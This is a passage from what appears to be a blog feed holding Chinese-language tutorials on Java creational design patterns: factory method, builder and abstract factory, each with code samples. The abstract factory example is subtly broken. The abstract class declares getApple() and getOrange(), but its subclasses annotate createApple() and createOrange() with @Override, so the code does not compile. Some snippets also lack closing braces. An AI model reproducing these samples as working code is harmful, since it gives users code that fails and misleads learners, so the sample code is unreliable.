<p>假如现在需要增加一个新的水果类型，就需要对工厂进行修改。这不符合开闭原则。（开闭原则：一个软件实体，比如类、模块和函数应该对扩展开放，对修改关闭）。</p>
<h2 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">FruitFactory</span> &lt;T <span class="keyword">extends</span> <span class="title class_">Fruit</span>&gt;&#123; <span class="comment">//将水果工厂抽象为抽象类，通过泛型指定水果类型</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> T <span class="title function_">getFruit</span><span class="params">()</span>;  <span class="comment">//不同的水果工厂，生产不同的水果</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AppleFactora</span> <span class="keyword">extends</span> <span class="title class_">FruitFactory</span>&lt;Apple&gt;&#123; <span class="comment">//假如需要苹果就创建一个苹果工厂类，新增橘子，蓝莓，等等同理</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Apple <span class="title function_">getFruit</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Apple</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Apple</span> <span class="variable">fruit</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AppleFactora</span>().getFruit();</span><br><span class="line">        System.out.println(fruit);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​	屏蔽了对象的创建细节，使用者只需要关心如何使用对象，降低了客户端与对象之间的耦合度。</p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>创建型-建造者模式</title>
    <url>/2024/05/08/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    String name;</span><br><span class="line">    String gender; </span><br><span class="line">    String profession;</span><br><span class="line">    List&lt;String&gt; awards;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(<span class="type">int</span> id, <span class="type">int</span> age, String name, String gender, String profession, List&lt;String&gt; awards)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.gender = gender; </span><br><span class="line">        <span class="built_in">this</span>.profession = profession;</span><br><span class="line">        <span class="built_in">this</span>.awards = awards;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>学生类的属性非常多，导致构造函数，也非常多，如果我们通过new的方式创建很容易填错参数位置。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        List&lt;String&gt; awards = Arrays.asList(<span class="string">&quot;LPL 春季赛冠军&quot;</span>,<span class="string">&quot;上海Major冠军&quot;</span>);</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="number">1</span>, <span class="number">18</span>, <span class="string">&quot;小明&quot;</span>, <span class="string">&quot;男&quot;</span>, <span class="string">&quot;计算机科学与技术&quot;</span>, awards);</span><br><span class="line">        System.out.println(student);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="建造者模式"><a href="#建造者模式" class="headerlink" title="建造者模式"></a>建造者模式</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    String name;</span><br><span class="line">    String gender; </span><br><span class="line">    String profession;</span><br><span class="line">    List&lt;String&gt; awards;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Student</span><span class="params">(<span class="type">int</span> id, <span class="type">int</span> age, String name, String gender, String profession, List&lt;String&gt; awards)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.gender = gender; </span><br><span class="line">        <span class="built_in">this</span>.profession = profession;</span><br><span class="line">        <span class="built_in">this</span>.awards = awards;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> StudentBuilder <span class="title function_">builder</span><span class="params">()</span> &#123;  <span class="comment">//通过builder直接获取建造者</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">StudentBuilder</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">StudentBuilder</span> &#123;</span><br><span class="line">        <span class="type">int</span> id;</span><br><span class="line">        <span class="type">int</span> age;</span><br><span class="line">        String name;</span><br><span class="line">        String gender;</span><br><span class="line">        String profession;</span><br><span class="line">        List&lt;String&gt; awards;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> StudentBuilder <span class="title function_">id</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.id = id;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> StudentBuilder <span class="title function_">age</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.age = age;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> StudentBuilder <span class="title function_">name</span><span class="params">(String name)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> StudentBuilder <span class="title function_">gender</span><span class="params">(String gender)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.gender = gender;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> StudentBuilder <span class="title function_">profession</span><span class="params">(String profession)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.profession = profession;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> StudentBuilder <span class="title function_">awards</span><span class="params">(List&lt;String&gt; awards)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.awards = awards;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Student <span class="title function_">build</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Student</span>(id, age, name, gender, profession, awards);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Student.<span class="type">StudentBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> Student.builder();</span><br><span class="line">        List&lt;String&gt; awards = Arrays.asList(<span class="string">&quot;LPL 春季赛冠军&quot;</span>, <span class="string">&quot;上海Major冠军&quot;</span>);</span><br><span class="line">        builder.id(<span class="number">1</span>).name(<span class="string">&quot;John Doe&quot;</span>).gender(<span class="string">&quot;Male&quot;</span>).awards(awards).profession(<span class="string">&quot;&quot;</span>).build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>建造者模式提供了一种清晰、灵活且易于维护的方式来构建对象，尤其适用于具有多个参数和复杂构建逻辑的情况。</strong></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>创建型-抽象工厂模式</title>
    <url>/2024/05/07/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​	工厂模式关注于创建单个对象，通过一个工厂类来实现。但是假如遇到需要创建一系列相关或相互依赖的对象的时候，就有些乏力了，而抽象工厂模式能很好的解决这个问题。</p>
<h2 id="抽象工厂模式"><a href="#抽象工厂模式" class="headerlink" title="抽象工厂模式"></a>抽象工厂模式</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Fruit</span> &#123; <span class="comment">//水果抽象类</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">Fruit</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name +<span class="string">&quot;@&quot;</span>+hashCode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Apple</span> <span class="keyword">extends</span> <span class="title class_">Fruit</span> &#123; <span class="comment">//水果实现类</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Apple</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="built_in">super</span>(<span class="string">&quot;苹果&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Orange</span> <span class="keyword">extends</span> <span class="title class_">Fruit</span> &#123; <span class="comment">//水果实现类</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Orange</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="string">&quot;橘子&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractFruitFactory</span> &#123;  <span class="comment">//抽象水果工厂</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> Fruit <span class="title function_">getApple</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> Fruit <span class="title function_">getOrange</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AppleFactory</span> <span class="keyword">extends</span> <span class="title class_">AbstractFruitFactory</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Fruit <span class="title function_">createApple</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Apple</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Fruit <span class="title function_">createOrange</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 在苹果工厂中不创建橘子</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrangeFactory</span> <span class="keyword">extends</span> <span class="title class_">AbstractFruitFactory</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Fruit <span class="title function_">createApple</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 在橘子工厂中不创建苹果</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Fruit <span class="title function_">createOrange</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Orange</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">AbstractFruitFactory</span> <span class="variable">appleFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AppleFactory</span>();</span><br><span class="line">        <span class="type">Fruit</span> <span class="variable">apple</span> <span class="operator">=</span> appleFactory.createApple();</span><br><span class="line">        System.out.println(apple);</span><br><span class="line"></span><br><span class="line">        <span class="type">AbstractFruitFactory</span> <span class="variable">orangeFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OrangeFactory</span>();</span><br><span class="line">        <span class="type">Fruit</span> <span class="variable">orange</span> <span class="operator">=</span> orangeFactory.createOrange();</span><br><span class="line">        System.out.println(orange);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="工厂模式和抽象工厂模式的区别"><a href="#工厂模式和抽象工厂模式的区别" class="headerlink" title="工厂模式和抽象工厂模式的区别"></a>工厂模式和抽象工厂模式的区别</h2><p>​	<strong>工厂模式关注于创建单个对象，通常是通过一个工厂类来实现。</strong></p>
<p>​	<strong>工厂模式适用于创建单个对象的场景，抽象工厂模式适用于需要创建一系列相关对象的场景。</strong></p>
<p>​	<strong>抽象工厂模式则更加封闭，因为它需要一次性定义所有产品族的创建方法。</strong></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA设计模式</tag>
      </tags>
  </entry>
</search>
